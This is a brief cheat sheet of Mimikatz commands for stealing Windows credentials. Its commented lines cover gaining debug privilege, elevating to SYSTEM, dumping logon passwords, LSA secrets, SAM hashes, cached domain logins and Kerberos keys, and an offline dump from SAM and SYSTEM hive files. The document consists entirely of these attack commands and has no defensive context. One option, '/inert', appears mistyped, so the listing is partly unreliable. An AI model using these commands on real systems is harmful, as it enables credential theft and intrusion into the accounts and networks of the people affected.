```powershell
# debug priv
privilege::debug
# elevate token to SYSTEM
token::elevate
# Credential dump
sekurlsa::logonpasswords
# LSA Secrets dump (local credentials)
lsadump::lsa /inert
# SAM dump
lsadump::sam
# Domain login cache credentials
lsadump::cache
# Extract kerberos ticket keys
sekurlsa::ekeys
# SAM, SYSTEM dump
lsadump::sam /system:system.hive /sam:sam.hive

```
